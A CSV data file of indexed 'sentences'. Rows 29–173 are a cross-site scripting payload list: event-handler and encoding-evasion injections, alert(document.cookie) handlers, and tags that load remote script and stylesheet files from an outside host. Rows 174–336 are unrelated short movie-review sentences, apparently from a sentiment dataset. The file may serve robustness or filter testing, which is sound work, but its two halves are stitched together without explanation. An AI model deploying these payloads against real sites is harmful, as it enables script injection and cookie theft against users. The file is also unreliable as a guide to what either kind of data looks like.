,index,sentence
29,29,"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>"
30,30,"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>"
31,31,"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>"
32,32,"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>"
33,33,"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>"
34,34,"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>"
35,35,"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>"
36,36,"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>"
37,37,"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>"
38,38,"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>"
39,39,"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>"
40,40,"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>"
41,41,"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>"
42,42,"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>"
43,43,"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>"
44,44,"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>"
45,45,"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>"
46,46,"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>"
47,47,"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>"
48,48,"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>"
49,49,"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>"
50,50,"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>"
51,51,"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>"
52,52,"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>"
53,53,"<object onError object onError=""javascript:javascript:alert(1)""></object onError>"
54,54,"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>"
55,55,"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>"
56,56,"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>"
57,57,"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>"
58,58,"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>"
59,59,"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>"
60,60,"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>"
61,61,"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>"
62,62,"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>"
63,63,"<body onload body onload=""javascript:javascript:alert(1)""></body onload>"
64,64,"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>"
65,65,"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>"
66,66,"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>"
67,67,"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>"
68,68,"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>"
69,69,"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>"
70,70,"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>"
71,71,"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>"
72,72,"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>"
73,73,"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>"
74,74,\x3Cscript>javascript:alert(1)</script>
75,75,"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>"
76,76,<script>javascript:alert(1)</script\x0D
77,77,<script>javascript:alert(1)</script\x0A
78,78,<script>javascript:alert(1)</script\x0B
79,79,"<script charset=""\x22>javascript:alert(1)</script>"
80,80,<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
81,81,--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
82,82,--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
83,83,--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
84,84,--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
85,85,"`""'><img src='#\x27 onerror=javascript:alert(1)>"
86,86,"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>"
87,87,"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>"
88,88,<iframe src=%(scriptlet)s <
89,89,"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">"
90,90,"<IMG DYNSRC=""javascript:javascript:alert(1)"">"
91,91,"<IMG LOWSRC=""javascript:javascript:alert(1)"">"
92,92,"<BGSOUND SRC=""javascript:javascript:alert(1);"">"
93,93,"<BR SIZE=""&{javascript:alert(1)}"">"
94,94,"<LAYER SRC=""%(scriptlet)s""></LAYER>"
95,95,"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">"
96,96,<STYLE>@import'%(css)s';</STYLE>
97,97,"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">"
98,98,"<XSS STYLE=""behavior: url(%(htc)s);"">"
99,99,"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS"
100,100,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">"
101,101,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">"
102,102,"<IFRAME SRC=""javascript:javascript:alert(1);""></IFRAME>"
103,103,"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">"
104,104,"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">"
105,105,"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">"
106,106,"<DIV STYLE=""width:expression(javascript:alert(1));"">"
107,107,"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">"
108,108,"<XSS STYLE=""xss:expression(javascript:alert(1))"">"
109,109,"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>"
110,110,"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>"
111,111,"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>"
112,112,<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
113,113,"<BASE HREF=""javascript:javascript:alert(1);//"">"
114,114,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>"
115,115,<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
116,116,"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
117,117,"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>"
118,118,"<SCRIPT SRC=""%(jpg)s""></SCRIPT>"
119,119,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-"
120,120,"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X"
121,121,<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
122,122,"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">"
123,123,<STYLE>@import'%(css)s';</STYLE>
124,124,<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
125,125,"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>"
126,126,<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
127,127,<style onreadystatechange=javascript:javascript:alert(1);></style>
128,128,"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>"
129,129,<embed code=%(scriptlet)s></embed>
130,130,<embed code=javascript:javascript:alert(1);></embed>
131,131,<embed src=%(jscript)s></embed>
132,132,<frameset onload=javascript:javascript:alert(1)></frameset>
133,133,<object onerror=javascript:javascript:alert(1)>
134,134,"<embed type=""image"" src=%(scriptlet)s></embed>"
135,135,"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1);"">]]</C><X></xml>"
136,136,<IMG SRC=&{javascript:alert(1);};>
137,137,"<a href=""jav&#65ascript:javascript:alert(1)"">test1</a>"
138,138,"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>"
139,139,"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>"
140,140,"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">"
141,141,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";"
142,142,"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--"
143,143,"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
144,144,"'';!--""<XSS>=&{()}"
145,145,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
146,146,"<IMG SRC=""javascript:alert('XSS');"">"
147,147,<IMG SRC=javascript:alert('XSS')>
148,148,<IMG SRC=JaVaScRiPt:alert('XSS')>
149,149,"<IMG SRC=javascript:alert(""XSS"")>"
150,150,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>"
151,151,"<a onmouseover=""alert(document.cookie)"">xxs link</a>"
152,152,<a onmouseover=alert(document.cookie)>xxs link</a>
153,153,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
154,154,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
155,155,"<IMG SRC=# onmouseover=""alert('xxs')"">"
156,156,"<IMG SRC= onmouseover=""alert('xxs')"">"
157,157,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
158,158,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
159,159,<SCRIPT SRC=//ha.ckers.org/.j>
160,160,"<IMG SRC=""javascript:alert('XSS')"""
161,161,<iframe src=http://ha.ckers.org/scriptlet.html <
162,162,"\"";alert('XSS');//"
163,163,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>"
164,164,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">"
165,165,"<BODY BACKGROUND=""javascript:alert('XSS')"">"
166,166,"<IMG DYNSRC=""javascript:alert('XSS')"">"
167,167,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">"
168,168,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">"
169,169,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
170,170,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">"
171,171,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>"
172,172,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>"
173,173,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">"
174,174,"the angst-ridden , affluent slacker characters are more grating than engaging ."
175,175,"maybe it 's the star power of the cast or the redundant messages , but something aboul `` full frontal '' seems , well , contrived ."
176,176,a budget affair that exposes the generally sad existence of the bedouins while providing a precious twinkle of insight into their lives .
177,177,"it does n't help that the director and cinematographer stephen kazmierski shoot on grungy video , giving the whole thing a dirty , tasteless feel ."
178,178,"this cheery , down-to-earth film is warm with the cozy feeling of relaxing around old friends ."
179,179,"it 's an example of sophisticated , challenging filmmaking that stands , despite its noticeable lack of emotional heft , in welcome contrast to the indulgent dead-end experimentation of the director 's previous full frontal ."
180,180,merchant effectively translates naipaul 's lively mix of characters from the page to screen .
181,181,"the angst-ridden , affluent slacker characters are more grating than engaging ."
182,182,"it 's the cinematic equivalent of a good page-turner , and even if it 's nonsense , its claws dig surprisingly deep ."
183,183,"... a cute and sometimes side-splittingly funny blend of legally blonde and drop dead gorgeous , starring piper perabo in what could be her breakthrough role ."
184,184,made by jackasses for jackasses .
185,185,"emerges as something rare , an issue movie that 's so honest and keenly observed that it does n't feel like one ."
186,186,"a recent favorite at sundance , this white-trash satire will inspire the affection of even those unlucky people who never owned a cassette of def leppard 's pyromania ."
187,187,an involving true story of a chinese actor who takes up drugs and winds up in an institution -- acted mostly by the actual people involved .
188,188,the movie bounces all over the map .
189,189,it has the courage to wonder about big questions with sincerity and devotion .
190,190,"watching scarlet diva , one is poised for titillation , raw insight or both ."
191,191,apparently kissing leads to suicide attempts and tragic deaths .
192,192,"only an epic documentary could get it all down , and spike lee 's jim brown : all american at long last gives its subject a movie worthy of his talents ."
193,193,do n't let your festive spirit go this far .
194,194,"if melville is creatively a great whale , this film is canned tuna ."
195,195,the whole damn thing is ripe for the jerry springer crowd .
196,196,"occasionally melodramatic , it 's also extremely effective ."
197,197,"director kapur is a filmmaker with a real flair for epic landscapes and adventure , and this is a better film than his earlier english-language movie , the overpraised elizabeth ."
198,198,"when it 's all wet , blue crush is highly enjoyable ."
199,199,... ( like ) channel surfing between the discovery channel and a late-night made-for-cable action movie .
200,200,"the problem with concept films is that if the concept is a poor one , there 's no saving the movie ."
201,201,new best friend should n't have gone straight to video ; it should have gone straight to a mystery science theater 3000 video .
202,202,even the unwatchable soapdish is more original .
203,203,"an overblown clunker full of bad jokes , howling cliches and by-the-numbers action sequences ."
204,204,"smart science fiction for grown-ups , with only a few false steps along the way ."
205,205,the use of cgi and digital ink-and-paint make the thing look really slick .
206,206,a historical epic with the courage of its convictions about both scope and detail .
207,207,"a resonant tale of racism , revenge and retribution ."
208,208,( sen 's ) soap opera-ish approach undermines his good intentions .
209,209,"( director ) byler may yet have a great movie in him , but charlotte sometimes is only half of one ."
210,210,the movie has lots of dancing and fabulous music .
211,211,"a highly intriguing thriller , coupled with some ingenious plot devices and some lavishly built settings . ."
212,212,well worth the time .
213,213,"overall , the film misses the brilliance of jelinek 's novel by some way ."
214,214,"( davis ) has a bright , chipper style that keeps things moving , while never quite managing to connect her wish-fulfilling characters to the human race ."
215,215,the movie is one of the best examples of artful large format filmmaking you are likely to see anytime soon .
216,216,hayek is stunning as frida and ... a star-making project .
217,217,a painfully leaden film destined for pre-dawn cable television slots .
218,218,"everything that has to do with yvan and charlotte , and everything that has to do with yvan 's rambunctious , jewish sister and her non-jew husband , feels funny and true ."
219,219,"when the first few villians are introduced as `` spider '' and `` snake '' you know you 're in for a real winner , creativity at its peak ."
220,220,"not every animated film from disney will become a classic , but forgive me if i 've come to expect more from this studio than some 79-minute after-school `` cartoon '' ."
221,221,"while this film is not in the least surprising , it is still ultimately very satisfying ."
222,222,"a hip ride into hyper-time , clockstoppers is a lively and enjoyable adventure for all ages at any time ."
223,223,john leguizamo may be a dramatic actor -- just not in this movie .
224,224,like mike does n't win any points for originality .
225,225,some movies are like a tasty hors-d'oeuvre ; this one is a feast .
226,226,"one of those movies where you walk out of the theater not feeling cheated exactly , but feeling pandered to , which , in the end , might be all the more infuriating ."
227,227,fuller would surely have called this gutsy and at times exhilarating movie a great yarn .
228,228,"it 's a brave attempt to tap into the heartbeat of the world , a salute to the universal language of rhythm and a zippy sampling of sounds ."
229,229,"an incredibly low-rent danish film , it brings a group of people together in a sweet and charming way , if a little convenient"
230,230,"it 's push-the-limits teen comedy , the type written by people who ca n't come up with legitimate funny , and it 's used so extensively that good bits are hopelessly overshadowed ."
231,231,"in a normal screen process , these bromides would be barely enough to sustain an interstitial program on the discovery channel ."
232,232,its underlying mythology is a hodgepodge of inconsistencies that pose the question : since when did dumb entertainment have to be this dumb ?
233,233,"their film falters , however , in its adherence to the disney philosophy of required poignancy , a salute that i 'd hoped the movie would avoid ."
234,234,an awkward and indigestible movie .
235,235,friday after next has the same problem that next friday did -- it 's called where 's chris tucker when you need him ?
236,236,another rent installment for the ian fleming estate .
237,237,"i can only imagine one thing worse than kevin spacey trying on an irish accent , and that 's sultry linda fiorentino doing the same thing ."
238,238,"afraid to pitch into farce , yet only half-hearted in its spy mechanics , all the queen 's men is finally just one long drag ."
239,239,"who knows what exactly godard is on about in this film , but his words and images do n't have to add up to mesmerize you ."
240,240,"herzog is obviously looking for a moral to his fable , but the notion that a strong , unified showing among germany and eastern european jews might have changed 20th-century history is undermined by ahola 's inadequate performance ."
241,241,the story and characters are nowhere near gripping enough .
242,242,"( a ) superbly controlled , passionate adaptation of graham greene 's 1955 novel ."
243,243,"though the violence is far less sadistic than usual , the film is typical miike : fast , furious and full of off-the-cuff imaginative flourishes ."
244,244,"its scenes and sensibility are all more than familiar , but it exudes a kind of nostalgic spy-movie charm and , at the same time , is so fresh and free of the usual thriller nonsense that it all seems to be happening for the first time ."
245,245,"like so many other allegedly scary movies , it gets so tangled up in the twist that it chokes the energy right out of the very audience it seeks to frighten ."
246,246,a bravura exercise in emptiness .
247,247,has a plot full of twists upon knots ... and a nonstop parade of mock-tarantino scuzbag types that starts out clever but veers into overkill .
248,248,too clunky and too busy ribbing itself to be truly entertaining .
249,249,a marvellous journey from childhood idealism to adolescent self-absorption .
250,250,"how on earth , or anywhere else , did director ron underwood manage to blow $ 100 million on this ?"
251,251,"a baffling misfire , and possibly the weakest movie ( woody allen ) has made in the last twenty years ."
252,252,hawke draws out the best from his large cast in beautifully articulated portrayals that are subtle and so expressive they can sustain the poetic flights in burdette 's dialogue .
253,253,the cartoon that is n't really good enough to be on afternoon tv is now a movie that is n't really good enough to be in theaters .
254,254,"a distant , even sterile , yet compulsively watchable look at the sordid life of hogan 's heroes star bob crane ."
255,255,you 've seen them a million times .
256,256,"the best you can say about it is it 's so uninspired , it barely gives one pause when considering some of the other dreck out there right now ."
257,257,arguably the year 's silliest and most incoherent movie .
258,258,"offensive in the way it exploits the hot-button issue of domestic abuse for cheap thrills and disgusting in the manner it repeatedly puts a small child in jeopardy , treating her as little more than a prop to be cruelly tormented ."
259,259,"one minute , you think you 're watching a serious actioner ; the next , it 's as though clips from the pink panther strikes again and/or sailor moon have been spliced in ."
260,260,"scene-by-scene , things happen , but you 'd be hard-pressed to say what or why ."
261,261,"a lousy movie that 's not merely unwatchable , but also unlistenable ."
262,262,an ultra-low-budget indie debut that smacks more of good intentions than talent .
263,263,"if you pitch your expectations at an all time low , you could do worse than this oddly cheerful -- but not particularly funny -- body-switching farce ."
264,264,will grab your children by the imagination and amaze them and amuse them .
265,265,the film starts out as competent but unremarkable ... and gradually grows into something of considerable power .
266,266,it would be hard to think of a recent movie that has worked this hard to achieve this little fun .
267,267,something the true film buff will enjoy .
268,268,"without resorting to hyperbole , i can state that kissing jessica stein may be the best same-sex romance i have seen ."
269,269,the cast is so low-wattage that none of the characters comes off as big ... and the setting remains indistinct .
270,270,"this is a throwaway , junk-food movie whose rap soundtrack was better tended to than the film itself ."
271,271,"a teasing drama whose relentless good-deed/bad-deed reversals are just interesting enough to make a sinner like me pray for an even more interesting , less symmetrical , less obviously cross-shaped creation ."
272,272,the movie exists for its soccer action and its fine acting .
273,273,"tim allen is great in his role but never hogs the scenes from his fellow cast , as there are plenty of laughs and good lines for everyone in this comedy ."
274,274,"a bowel-curdling , heart-stopping recipe for terror ."
275,275,nicely serves as an examination of a society in transition .
276,276,"if you 're looking for comedy to be served up , better look elsewhere ."
277,277,"after that , it just gets stupid and maudlin ."
278,278,"the humor is hinged on the belief that knees in the crotch , elbows in the face and spit in the eye are inherently funny ."
279,279,engagingly captures the maddening and magnetic ebb and flow of friendship .
280,280,"sam jones became a very lucky filmmaker the day wilco got dropped from their record label , proving that one man 's ruin may be another 's fortune ."
281,281,"the film benefits greatly from a less manic tone than its predecessor , as cho appears to have settled comfortably into her skin ."
282,282,"the charms of willful eccentricity , at least as evidenced by this latest cinematic essay , are beginning to wear a bit thin ."
283,283,"it feels like a community theater production of a great broadway play : even at its best , it will never hold a candle to the original ."
284,284,"a tough go , but leigh 's depth and rigor , and his skill at inspiring accomplished portrayals that are all the more impressive for their lack of showiness , offsets to a notable degree the film 's often-mined and despairing milieu ."
285,285,an irresistible combination of a rousing good story set on a truly grand scale .
286,286,frida 's artistic brilliance is undeniable -- it 's among the most breathtakingly designed films i 've ever seen .
287,287,the movie stays afloat thanks to its hallucinatory production design .
288,288,provide ( s ) nail-biting suspense and credible characters without relying on technology-of-the-moment technique or pretentious dialogue .
289,289,"smith 's approach is never to tease , except gently and in that way that makes us consider our own eccentricities and how they are expressed through our homes ."
290,290,a modest and messy metaphysical thriller offering more questions than answers .
291,291,a refreshing korean film about five female high school friends who face an uphill battle when they try to take their relationships into deeper waters .
292,292,"now it 's a bad , embarrassing movie ."
293,293,"celebrated at sundance , this slight comedy of manners has winning performances and a glossy , glib charm that 's hard to beat ."
294,294,... the sum of the parts equals largely a confused mediocrity .
295,295,it 's solid and affecting and exactly as thought-provoking as it should be .
296,296,"enough trivializes an important crisis , reduces it to an almost comic embarrassment ."
297,297,"between bedroom scenes , viewers may find themselves wishing they could roll over and take a nap ."
298,298,genuinely touching because it 's realistic about all kinds of love .
299,299,"a lighthearted , feel-good film that embraces the time-honored truth that the most powerful thing in life is love ."
300,300,"( two ) fairly dull -- contrasting and interlocking stories about miserable scandinavian settlers in 18th-century canada , and yuppie sailboaters in the here and now ."
301,301,a quietly reflective and melancholy new zealand film about an eventful summer in a 13-year-old girl 's life .
302,302,"reign of fire may be little more than another platter of reheated aliens , but it 's still pretty tasty ."
303,303,provides an intriguing window into the imagination and hermetic analysis of todd solondz .
304,304,"dull , if not devoid of wit , this shaggy dog longs to frisk through the back alleys of history , but scarcely manages more than a modest , snoozy charm ."
305,305,"the movie 's ripe , enrapturing beauty will tempt those willing to probe its inscrutable mysteries ."
306,306,a predictable and stereotypical little b-movie .
307,307,it 's astonishing .
308,308,"this is such a high-energy movie where the drumming and the marching are so excellent , who cares if the story 's a little weak ."
309,309,claude miller airs out a tight plot with an easy pace and a focus on character drama over crime-film complications .
310,310,"myers never knows when to let a gag die ; thus , we 're subjected to one mind-numbingly lengthy riff on poo and pee jokes after another ."
311,311,if you can get past the fantastical aspects and harsh realities of `` the isle '' you 'll get a sock-you-in-the-eye flick that is a visual tour-de-force and a story that is unlike any you will likely see anywhere else .
312,312,"enormously likable , partly because it is aware of its own grasp of the absurd ."
313,313,i cry for i spy -- or i would if this latest and laziest imaginable of all vintage-tv spinoffs were capable of engendering an emotional response of any kind .
314,314,a mostly tired retread of several other mob tales .
315,315,but it pays a price for its intricate intellectual gamesmanship .
316,316,"the stunning , dreamlike visuals will impress even those viewers who have little patience for euro-film pretension ."
317,317,"a movie that will touch the hearts of both children and adults , as well as bring audiences to the edge of their seats ."
318,318,a film that is a portrait of grace in an imperfect world .
319,319,i do n't have an i am sam clue .
320,320,the piano teacher is the sort of movie that discourages american audiences from ever wanting to see another foreign film .
321,321,the film equivalent of a toy chest whose contents get scattered over the course of 80 minutes .
322,322,"suggests puns about ingredients and soup and somebody being off their noodle , but let 's just say the ingredients do n't quite add up to a meal ."
323,323,the film is really not so much bad as bland .
324,324,"cho 's fearless in picking apart human foibles , not afraid to lay her life bare in front of an audience ."
325,325,noyce 's film is contemplative and mournfully reflective .
326,326,"i doubt anyone will remember the picture by the time christmas really rolls around , but maybe it 'll be on video by then ."
327,327,"merely as a technical , logistical feat , russian ark marks a cinematic milestone ."
328,328,more than makes up for its mawkish posing by offering rousing spates of genuine feeling .
329,329,"a real story about real people living their lives concerned about the future of an elderly , mentally handicapped family member ."
330,330,"painful to watch , but viewers willing to take a chance will be rewarded with two of the year 's most accomplished and riveting film performances ."
331,331,"the laser-projected paintings provide a spell-casting beauty , while russell and dreyfus are a romantic pairing of hearts , preciously exposed as history corners them ."
332,332,"`` men in black ii , '' has all the earmarks of a sequel ."
333,333,any film featuring young children threatened by a terrorist bomb can no longer pass as mere entertainment .
334,334,let 's cut to the consumer-advice bottom line : stay home .
335,335,the long-range appeal of `` minority report '' should transcend any awards it bags .
336,336,"... perhaps the heaviest , most joyless movie ever made about giant dragons taking over the world ."
